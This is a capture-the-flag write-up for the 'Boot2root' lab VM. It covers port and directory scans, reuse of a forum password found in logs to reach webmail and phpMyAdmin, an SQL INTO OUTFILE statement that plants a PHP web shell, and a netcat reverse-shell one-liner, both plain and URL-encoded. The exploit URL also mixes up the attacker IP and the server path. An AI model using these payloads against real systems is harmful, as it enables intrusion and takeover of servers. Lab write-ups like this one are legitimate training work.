# Boot2root

### Scan Nmap

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 09:31 UTC
Nmap scan report for 192.168.56.101
Host is up (0.00028s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 2.0.8 or later
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 07:bf:02:20:f0:8a:c8:48:1e:fc:41:ae:a4:46:fa:25 (DSA)
|   2048 26:dd:80:a3:df:c4:4b:53:1e:53:42:46:ef:6e:30:b2 (RSA)
|_  256 cf:c3:8c:31:d7:47:7c:84:e2:d2:16:31:b2:8e:63:a7 (ECDSA)
80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Hack me if you can
|_http-server-header: Apache/2.2.22 (Ubuntu)
143/tcp open  imap       Dovecot imapd
|_imap-capabilities: more capabilities IDLE IMAP4rev1 STARTTLS LOGINDISABLEDA0001 have post-login listed OK SASL-IR LOGIN-REFERRALS LITERAL+ ID Pre-login ENABLE
|_ssl-date: 2025-02-13T09:32:31+00:00; -1s from scanner time.
443/tcp open  ssl/http   Apache httpd 2.2.22
|_ssl-date: 2025-02-13T09:32:31+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=BornToSec
| Not valid before: 2015-10-08T00:19:46
|_Not valid after:  2025-10-05T00:19:46
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: 404 Not Found
993/tcp open  ssl/imaps?
|_ssl-date: 2025-02-13T09:32:31+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=2/13%OT=21%CT=1%CU=38008%PV=Y%DS=2%DC=T%G=Y%TM=67ADBC3
OS:0%P=x86_64-unknown-linux-gnu)SEQ(SP=11%GCD=FA00%ISR=9C%TI=I%CI=I%TS=U)OP
OS:S(O1=MFFC8%O2=MFFC8%O3=MFFC8%O4=MFFC8%O5=MFFC8%O6=MFFC8)WIN(W1=FFFF%W2=F
OS:FFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)ECN(R=Y%DF=N%T=40%W=FFFF%O=MFFC8%CC=
OS:N%Q=)T1(R=Y%DF=N%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=N%T=
OS:FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=40%W=FFFF%S=Z%A=S+%F=AR%O=%R
OS:D=0%Q=)T6(R=Y%DF=N%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=
OS:FF%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N) 
```

### Scan Dirbuster

```
Dir found: /cgi-bin/ - 403
Dir found: /forum/ - 200
Dir found: /icons/ - 403
Dir found: /phpmyadmin/ - 200
File found: /forum/index.php - 200
Dir found: /forum/themes/ - 200
Dir found: /forum/themes/default/ - 200
Dir found: /forum/themes/default/images/ - 200
Dir found: /forum/js/ - 200
File found: /forum/js/main.min.js - 200
File found: /phpmyadmin/url.php - 200
File found: /phpmyadmin/Documentation.html - 200
Dir found: /webmail/ - 302
```

### Forum

#### Index
![screenshot](screen/forumIndex.png)

#### Problem login --> author lmezard
![screenshot](screen/forumLogs.png)

#### Password ??? --> ```!q\]Ej?*5K5cy*AJ```

#### Connected
```
Pseudo: lmezard
Password: !q\]Ej?*5K5cy*AJ
```
![screenshot](screen/lmezardProfile.png)

#### Get email

```
Dir found: /webmail/
Email: laurie@borntosec.net
Password: !q\]Ej?*5K5cy*AJ
```

![screenshot](screen/webmailIndex.png)

#### DB access
![screenshot](screen/webmailDBaccess.png)

#### Connected on phpmyadmin with root user !
![screenshot](screen/Userinfophpmyadmin.png)


#### Send request sql on `/var/www/forum/template_c/`
```
SELECT '<?php system($_GET["payload"]); ?>' INTO OUTFILE "/var/www/forum/templates_c/exploit.php"
```
![screenshot](screen/SQLrequest.png)

#### Testing vulnerability
![screenshot](screen/testvulnerability.png)

![screenshot](screen/vulnOK.png)

#### Exploit with reverse shell 
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.56.1 9999 >/tmp/f

URL encode: rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.56.1%209999%20%3E%2Ftmp%2Ff

https://192.168.56.1:443/var/www/forum/templates_c/exploit.php?payload=

https://192.168.56.1:443/var/www/forum/templates_c/exploit.php?payload=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.56.1%209999%20%3E%2Ftmp%2Ff

```

```
Listen with nc: 

nc -lnvp 9999
```
